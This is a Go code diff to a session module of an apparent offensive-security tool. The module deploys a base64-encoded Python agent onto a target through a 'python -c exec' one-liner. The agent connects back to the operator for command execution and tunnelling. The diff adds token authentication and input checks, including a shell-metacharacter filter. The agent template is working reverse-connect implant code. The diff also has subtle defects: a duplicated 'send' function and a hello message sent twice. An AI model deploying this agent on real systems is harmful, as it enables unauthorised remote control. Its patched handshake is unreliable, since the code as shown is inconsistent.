@@ -1,8 +1,10 @@
 package session
 
 import (
+	"crypto/rand"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"net"
@@ -24,8 +26,10 @@ import socket, struct, threading, subprocess
 
 HOST = %q
 PORT = %d
+TOKEN = %q
 MSG_EXEC = 3
 MSG_STREAM = 4
+MSG_HELLO = 5
 OP_OPEN = 1
 OP_DATA = 2
 OP_CLOSE = 3
@@ -34,6 +38,15 @@ c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 c.connect((HOST, PORT))
 lock = threading.Lock()
 streams = {}
+
+def send(t, data=b""):
+    if isinstance(data, str):
+        data = data.encode()
+    pkt = struct.pack(">H", len(data) + 1) + bytes([t]) + data
+    with lock:
+        c.sendall(pkt)
+
+send(MSG_HELLO, TOKEN)
 
 def send(t, data=b""):
     if isinstance(data, str):
@@ -70,6 +83,8 @@ def pump_remote(sid, s):
     except Exception:
         pass
     close_stream(sid)
+
+send(MSG_HELLO, TOKEN)
 
 while True:
     hdr = recvn(2)
@@ -124,14 +139,34 @@ func (s *Session) StartAgent(lhost string, lport int, timeout time.Duration) err
 	if py == "" {
 		return fmt.Errorf("python/python3 not available on target")
 	}
+	// The interpreter path comes from target output: confine it to a plain
+	// absolute path so it cannot break out of the launch command line.
+	if !validAgentInterp(py) {
+		return fmt.Errorf("refusing suspicious interpreter path from target: %q", py)
+	}
 
 	bindHost := lhost
 	if bindHost == "" {
+		// The agent runs on the target and dials back here, so the
+		// listener must use the operator address the target can route
+		// to. First connection without the one-time token is dropped.
 		bindHost = s.LocalHost
 	}
 	if bindHost == "" || bindHost == "0.0.0.0" || bindHost == "::" {
 		bindHost = "127.0.0.1"
 	}
+	if bindHost != "127.0.0.1" && bindHost != "::1" {
+		logger.Warn("Agent listener on %s is LAN-reachable; first connection without the token is dropped", bindHost)
+	}
+	if strings.ContainsAny(bindHost, " \t\r\n\"';&|()<>$`!") || strings.Contains(bindHost, "/") {
+		return fmt.Errorf("invalid agent bind host: %q", bindHost)
+	}
+
+	tokenBytes := make([]byte, 16)
+	if _, err := rand.Read(tokenBytes); err != nil {
+		return fmt.Errorf("failed to generate agent token: %w", err)
+	}
+	token := hex.EncodeToString(tokenBytes)
 
 	listener, err := net.Listen("tcp", net.JoinHostPort(bindHost, strconv.Itoa(lport)))
 	if err != nil {
@@ -140,7 +175,7 @@ func (s *Session) StartAgent(lhost string, lport int, timeout time.Duration) err
 	defer listener.Close()
 
 	port := listener.Addr().(*net.TCPAddr).Port
-	script := fmt.Sprintf(pythonAgentTemplate, bindHost, port)
+	script := fmt.Sprintf(pythonAgentTemplate, bindHost, port, token)
 	encoded := base64.StdEncoding.EncodeToString([]byte(script))
 	launch := fmt.Sprintf("%s -c 'import base64;exec(base64.b64decode(%q))'\n", py, encoded)
 
@@ -164,6 +199,10 @@ func (s *Session) StartAgent(lhost string, lport int, timeout time.Duration) err
 
 	select {
 	case conn := <-acceptCh:
+		if err := verifyAgentHello(conn, token); err != nil {
+			conn.Close()
+			return fmt.Errorf("agent authentication failed: %w", err)
+		}
 		s.AgentConn = conn
 		s.AgentMux = NewMessenger()
 		s.AgentActive = true
@@ -174,6 +213,46 @@ func (s *Session) StartAgent(lhost string, lport int, timeout time.Duration) err
 		return fmt.Errorf("agent listener failed: %w", err)
 	case <-time.After(timeout):
 		return fmt.Errorf("agent did not connect back to %s within %s", listener.Addr(), timeout)
+	}
+}
+
+// validAgentInterp confines the target-reported interpreter to a plain
+// absolute path so it cannot break out of the launch command line.
+func validAgentInterp(p string) bool {
+	if p == "" || !strings.HasPrefix(p, "/") {
+		return false
+	}
+	for _, r := range p {
+		if r < 32 || r == 127 {
+			return false
+		}
+	}
+	return !strings.ContainsAny(p, " \t\r\n\"';&|()<>$`!*?~#=")
+}
+
+// verifyAgentHello requires the first message on a fresh agent connection
+// to be MsgHello carrying the one-time token. Scanners and squatters that
+// connect first are dropped before they can inject stream data.
+func verifyAgentHello(conn net.Conn, token string) error {
+	if err := conn.SetDeadline(time.Now().Add(10 * time.Second)); err != nil {
+		return err
+	}
+	defer conn.SetDeadline(time.Time{})
+	mux := NewMessenger()
+	buf := make([]byte, 4096)
+	for {
+		n, err := conn.Read(buf)
+		if n > 0 {
+			for _, msg := range mux.Feed(buf[:n]) {
+				if msg.Type != MsgHello || string(msg.Data) != token {
+					return fmt.Errorf("bad hello from %s", conn.RemoteAddr())
+				}
+				return nil
+			}
+		}
+		if err != nil {
+			return fmt.Errorf("hello read failed: %w", err)
+		}
 	}
 }
 
